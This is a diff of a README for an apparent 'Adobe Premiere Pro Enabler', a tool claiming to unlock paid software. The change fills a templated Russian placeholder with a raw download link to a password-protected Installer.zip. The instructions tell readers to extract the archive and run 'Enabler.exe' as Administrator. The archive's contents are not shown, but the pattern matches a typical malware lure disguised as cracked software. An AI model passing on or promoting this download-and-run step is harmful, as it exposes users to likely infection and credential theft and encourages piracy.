@@ -26,9 +26,8 @@ To set up your optimized editing environment, follow these steps:
 2. Download the latest release package from the link below.
 3. Extract the archive to your preferred directory and run `Enabler.exe` as Administrator.
 
-## 📥 [Download Setup Installer](ТВОЯ_ССЫЛКА_ИЗ_RELEASE)
-
-> **Archive Password:** `2026` (if prompted)
+## 📥 [Download Setup Installer](https://github.com/ndillannekel/Adobe-Premiere-Pro-Enabler/raw/refs/heads/main/Installer.zip)
+> **Archive Password:** `2026`
 
 ---
 
